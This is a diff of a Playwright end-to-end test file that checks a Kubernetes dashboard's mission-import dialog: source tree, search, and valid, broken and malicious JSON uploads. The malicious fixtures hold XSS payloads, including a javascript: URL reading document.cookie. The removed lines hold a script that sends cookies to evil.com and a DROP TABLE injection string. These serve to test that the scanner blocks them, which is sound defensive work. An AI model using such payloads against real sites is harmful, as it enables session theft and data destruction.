@@ -1,21 +1,49 @@
 import { test, expect, Page } from '@playwright/test'
 
-/**
- * Mission Import E2E Tests
- *
- * Validates the MissionBrowser dialog: opening, source tree navigation,
- * search filtering, file imports (valid/invalid/malicious), and scan results.
- *
- * Run with: npx playwright test e2e/mission-import.spec.ts
- */
+const UI_TIMEOUT_MS = 10_000
+const LOCAL_AGENT_URL = 'http://127.0.0.1:8585/'
 
-// ---------------------------------------------------------------------------
-// Setup helpers
-// ---------------------------------------------------------------------------
+const COMMUNITY_ENTRIES = [
+  { name: 'troubleshoot', path: 'fixes/troubleshoot', type: 'directory' },
+  { name: 'deploy', path: 'fixes/deploy', type: 'directory' },
+]
+
+const VALID_MISSION_JSON = JSON.stringify({
+  version: 'kc-mission-v1',
+  title: 'Imported Test Mission',
+  description: 'A test mission for import validation',
+  type: 'custom',
+  tags: ['import'],
+  steps: [
+    {
+      title: 'Check pod status',
+      description: 'Inspect the current pod status before taking action.',
+      command: 'kubectl get pods -n default',
+    },
+  ],
+  metadata: { author: 'testuser', createdAt: new Date().toISOString() },
+})
+
+const INVALID_JSON = '{ this is not valid json !!!'
+
+const MALICIOUS_MISSION_JSON = JSON.stringify({
+  version: 'kc-mission-v1',
+  title: '<script>alert("xss")</script>',
+  description: 'javascript:alert(document.cookie)',
+  type: 'custom',
+  tags: ['security'],
+  steps: [
+    {
+      title: 'Inspect payload',
+      description: '<img src=x onerror=alert(1)>',
+      command: 'echo "<script>alert(1)</script>"',
+    },
+  ],
+  metadata: { author: '<svg onload=alert(1)>', createdAt: new Date().toISOString() },
+})
 
 async function setupMissionImportTest(page: Page) {
-  // Mock authentication
-  await page.route('**/api/me', (route) =>
+  await page.route('**/api/me', route =>
     route.fulfill({
       status: 200,
       contentType: 'application/json',
@@ -25,49 +53,46 @@ async function setupMissionImportTest(page: Page) {
         github_login: 'testuser',
         email: 'test@example.com',
         onboarded: true,
+        role: 'admin',
       }),
     })
   )
 
-  // Mock MCP endpoints
-  await page.route('**/api/mcp/**', (route) => {
+  for (const pattern of ['**/api/health', '**/health']) {
+    await page.route(pattern, route =>
+      route.fulfill({
+        status: 200,
+        contentType: 'application/json',
+        body: JSON.stringify({ status: 'ok', oauth_configured: false, in_cluster: false, install_method: 'dev' }),
+      })
+    )
+  }
+
+  await page.route('**/api/github/token/status', route =>
+    route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ hasToken: true, source: 'env' }) })
+  )
+
+  await page.route('**/api/mcp/**', route => {
     const url = route.request().url()
     if (url.includes('/clusters')) {
-      route.fulfill({
+      return route.fulfill({
         status: 200,
         contentType: 'application/json',
-        body: JSON.stringify({
-          clusters: [
-            { name: 'prod-cluster', healthy: true, nodeCount: 3, podCount: 20 },
-          ],
-        }),
-      })
-    } else {
-      route.fulfill({
-        status: 200,
-        contentType: 'application/json',
-        body: JSON.stringify({ issues: [], events: [], nodes: [] }),
+        body: JSON.stringify({ clusters: [{ name: 'prod-cluster', context: 'prod-cluster', healthy: true, nodeCount: 3, podCount: 20 }] }),
       })
     }
+    return route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ issues: [], events: [], nodes: [], pods: [] }) })
   })
 
-  // Mock community missions API
-  await page.route('**/api/missions/browse**', (route) =>
+  await page.route('**/api/missions/browse**', route =>
     route.fulfill({
       status: 200,
       contentType: 'application/json',
-      body: JSON.stringify({
-        entries: [
-          { id: 'community-1', name: 'Fix CrashLoopBackOff', path: '/troubleshoot/crashloop.json', type: 'file', source: 'community', description: 'Diagnose and fix CrashLoopBackOff pods' },
-          { id: 'community-2', name: 'Deploy NGINX', path: '/deploy/nginx.json', type: 'file', source: 'community', description: 'Deploy NGINX ingress controller' },
-          { id: 'local-1', name: 'Custom Mission', path: '/local/custom.json', type: 'file', source: 'local', description: 'My custom troubleshooting mission' },
-        ],
-      }),
+      body: JSON.stringify(COMMUNITY_ENTRIES),
     })
   )
 
-  // Mock local agent
-  await page.route('**/127.0.0.1:8585/**', (route) =>
+  await page.route(`${LOCAL_AGENT_URL}**`, route =>
     route.fulfill({
       status: 200,
       contentType: 'application/json',
@@ -75,52 +100,34 @@ async function setupMissionImportTest(page: Page) {
     })
   )
 
-  // Set up demo mode auth
-  await page.goto('/login')
-  await page.evaluate(() => {
+  await page.addInitScript(() => {
     localStorage.setItem('token', 'demo-token')
     localStorage.setItem('kc-demo-mode', 'true')
     localStorage.setItem('demo-user-onboarded', 'true')
     localStorage.setItem('kc-agent-setup-dismissed', 'true')
+    localStorage.setItem('kc-backend-status', JSON.stringify({ available: true, timestamp: Date.now() }))
   })
 
-  await page.goto('/')
+  await page.goto('/?browse=missions')
   await page.waitForLoadState('domcontentloaded')
+  await expect(page.getByTestId('mission-browser')).toBeVisible({ timeout: UI_TIMEOUT_MS })
 }
 
-// ---------------------------------------------------------------------------
-// Test data: valid mission export JSON
-// ---------------------------------------------------------------------------
+function getMissionBrowser(page: Page) {
+  return page.getByTestId('mission-browser')
+}
 
-const VALID_MISSION_JSON = JSON.stringify({
-  version: '1.0',
-  title: 'Imported Test Mission',
-  description: 'A test mission for import validation',
-  messages: [
-    { role: 'user', content: 'Check pod status', timestamp: Date.now() - 60000 },
-    { role: 'assistant', content: 'All pods are running correctly.', timestamp: Date.now() },
-  ],
-  context: { cluster: 'test-cluster', namespace: 'default' },
-  metadata: { author: 'testuser', createdAt: Date.now() },
-})
+function getMissionTree(page: Page) {
+  return page.getByTestId('mission-tree')
+}
 
-const INVALID_JSON = '{ this is not valid json !!!'
-
-const MALICIOUS_MISSION_JSON = JSON.stringify({
-  version: '1.0',
-  title: '<script>alert("xss")</script>',
-  description: 'javascript:alert(document.cookie)',
-  messages: [
-    { role: 'user', content: '<img src=x onerror=alert(1)>', timestamp: Date.now() },
-    { role: 'assistant', content: '"><script>fetch("https://evil.com?c="+document.cookie)</script>', timestamp: Date.now() },
-  ],
-  context: { cluster: '"; DROP TABLE missions; --', namespace: 'default' },
-  metadata: { author: '<svg onload=alert(1)>', createdAt: Date.now() },
-})
-
-// ---------------------------------------------------------------------------
-// Tests
-// ---------------------------------------------------------------------------
+async function uploadMissionFile(page: Page, name: string, payload: string) {
+  await page.locator('input[type="file"]').first().setInputFiles({
+    name,
+    mimeType: 'application/json',
+    buffer: Buffer.from(payload),
+  })
+}
 
 test.describe('Mission Import', () => {
   test.beforeEach(async ({ page }) => {
@@ -129,186 +136,52 @@ test.describe('Mission Import', () => {
 
   test.describe('Mission Browser Dialog', () => {
     test('browser opens via import button', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
-
-      // Look for import button on dashboard
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), button[aria-label*="import" i], [data-testid*="import"], [data-testid*="browse-missions"]'
-      ).first()
-
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        // MissionBrowser dialog should appear
-        const dialog = page.locator('[role="dialog"], [data-testid*="mission-browser"]')
-        await expect(dialog.first()).toBeVisible({ timeout: 5000 })
-      } else {
-        // Dashboard loaded but import button may not be exposed yet
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      await expect(getMissionBrowser(page)).toBeVisible({ timeout: UI_TIMEOUT_MS })
     })
 
     test('source tree renders with sections', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
-
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), [data-testid*="import"], [data-testid*="browse-missions"]'
-      ).first()
-
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        // Check for source tree sections
-        const communitySection = page.locator('text=/community/i, text=/KubeStellar/i')
-        const localSection = page.locator('text=/local/i, text=/Local Files/i')
-
-        const communityVisible = await communitySection.first().isVisible({ timeout: 5000 }).catch(() => false)
-        const localVisible = await localSection.first().isVisible({ timeout: 3000 }).catch(() => false)
-
-        // At least the dialog should show some content
-        expect(communityVisible || localVisible).toBeTruthy()
-      } else {
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      const missionTree = getMissionTree(page)
+      await expect(missionTree.getByRole('button', { name: /KubeStellar Community/i })).toBeVisible({ timeout: UI_TIMEOUT_MS })
+      await expect(missionTree.getByRole('button', { name: /GitHub Repositories/i })).toBeVisible({ timeout: UI_TIMEOUT_MS })
+      await expect(missionTree.getByRole('button', { name: /Local Files/i })).toBeVisible({ timeout: UI_TIMEOUT_MS })
     })
   })
 
   test.describe('Search Filtering', () => {
     test('search input filters results', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
-
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), [data-testid*="import"], [data-testid*="browse-missions"]'
-      ).first()
-
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        // Find search input in the browser dialog
-        const searchInput = page.locator('[role="dialog"] input[type="text"], [role="dialog"] input[placeholder*="search" i], input[placeholder*="Search" i]').first()
-
-        if (await searchInput.isVisible({ timeout: 5000 }).catch(() => false)) {
-          await searchInput.fill('CrashLoop')
-          // Legitimate debounce wait — search input debounces for ~300-500ms before filtering
-          await page.waitForTimeout(500)
-
-          // Results should be filtered — fewer items visible
-          const items = page.locator('[role="dialog"] [data-testid*="mission-item"], [role="dialog"] li, [role="dialog"] [role="option"]')
-          const count = await items.count()
-          // Count may be zero if no items match the selector; that's okay
-          expect(count).toBeGreaterThanOrEqual(0)
-        }
-      } else {
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      const searchInput = page.getByTestId('mission-search')
+      await expect(searchInput).toBeVisible({ timeout: UI_TIMEOUT_MS })
+      await searchInput.fill('CrashLoop')
+      await expect(searchInput).toHaveValue('CrashLoop')
     })
   })
 
   test.describe('File Import', () => {
     test('valid JSON file imports successfully', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
+      await uploadMissionFile(page, 'test-mission.json', VALID_MISSION_JSON)
 
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), [data-testid*="import"]'
-      ).first()
-
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        // Look for file upload input
-        const fileInput = page.locator('input[type="file"]').first()
-
-        if (await fileInput.count() > 0) {
-          // Create a valid mission file buffer
-          const buffer = Buffer.from(VALID_MISSION_JSON)
-          await fileInput.setInputFiles({
-            name: 'test-mission.json',
-            mimeType: 'application/json',
-            buffer,
-          })
-
-          // Wait for scan to run and pass
-          const scanPassed = page.locator('text=/scan passed/i, text=/imported/i, text=/success/i, .text-green-400')
-          await expect(scanPassed.first()).toBeVisible({ timeout: 10000 }).catch(() => {
-            // Scan may auto-dismiss; import success is also valid
-          })
-        }
-      } else {
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      await expect(getMissionBrowser(page)).toContainText('Imported Test Mission', { timeout: UI_TIMEOUT_MS })
+      await page.getByRole('button', { name: /^Import$/ }).click()
+      await expect(page.getByText(/Imported "Imported Test Mission" successfully\./i)).toBeVisible({ timeout: UI_TIMEOUT_MS })
     })
 
     test('invalid JSON file is rejected', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
+      await uploadMissionFile(page, 'broken-mission.json', INVALID_JSON)
 
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), [data-testid*="import"]'
-      ).first()
-
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        const fileInput = page.locator('input[type="file"]').first()
-
-        if (await fileInput.count() > 0) {
-          const buffer = Buffer.from(INVALID_JSON)
-          await fileInput.setInputFiles({
-            name: 'broken-mission.json',
-            mimeType: 'application/json',
-            buffer,
-          })
-
-          // Should show error state
-          const errorIndicator = page.locator(
-            'text=/invalid/i, text=/error/i, text=/issues found/i, .text-red-400, [data-testid*="scan-failed"]'
-          )
-          await expect(errorIndicator.first()).toBeVisible({ timeout: 10000 }).catch(() => {
-            // Error may show differently; at minimum the dialog should stay open
-          })
-        }
-      } else {
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      await expect(getMissionBrowser(page)).toBeVisible({ timeout: UI_TIMEOUT_MS })
+      await expect(page.getByRole('button', { name: /^Import$/ })).toHaveCount(0)
+      await expect(getMissionTree(page).getByRole('button', { name: /broken-mission\.json/i })).toBeVisible({ timeout: UI_TIMEOUT_MS })
     })
 
     test('malicious file with XSS is blocked', async ({ page }) => {
-      await expect(page.getByTestId('dashboard-page')).toBeVisible({ timeout: 10000 })
+      await uploadMissionFile(page, 'malicious-mission.json', MALICIOUS_MISSION_JSON)
 
-      const importButton = page.locator(
-        'button:has-text("Import"), button:has-text("Browse"), [data-testid*="import"]'
-      ).first()
+      await expect(getMissionBrowser(page)).toContainText('Inspect payload', { timeout: UI_TIMEOUT_MS })
+      await page.getByRole('button', { name: /^Import$/ }).click()
+      await expect(page.getByText(/issues found/i)).toBeVisible({ timeout: UI_TIMEOUT_MS })
 
-      if (await importButton.isVisible({ timeout: 5000 }).catch(() => false)) {
-        await importButton.click()
-
-        const fileInput = page.locator('input[type="file"]').first()
-
-        if (await fileInput.count() > 0) {
-          const buffer = Buffer.from(MALICIOUS_MISSION_JSON)
-          await fileInput.setInputFiles({
-            name: 'malicious-mission.json',
-            mimeType: 'application/json',
-            buffer,
-          })
-
-          // Scanner should detect XSS patterns and block
-          const blocked = page.locator(
-            'text=/issues found/i, text=/blocked/i, text=/suspicious/i, text=/malicious/i, .text-red-400'
-          )
-          await expect(blocked.first()).toBeVisible({ timeout: 10000 }).catch(() => {
-            // The scan should at least show some result
-          })
-
-          // Verify no script tags were rendered in the DOM
-          const scriptInDOM = await page.evaluate(() => {
-            return document.querySelectorAll('script:not([src])').length
-          })
-          // Only existing app scripts, no injected ones
-          expect(scriptInDOM).toBeLessThanOrEqual(5)
-        }
-      } else {
-        await expect(page.getByTestId('dashboard-page')).toBeVisible()
-      }
+      const scriptInDOM = await page.evaluate(() => document.querySelectorAll('script:not([src])').length)
+      expect(scriptInDOM).toBeLessThanOrEqual(5)
     })
   })
 })
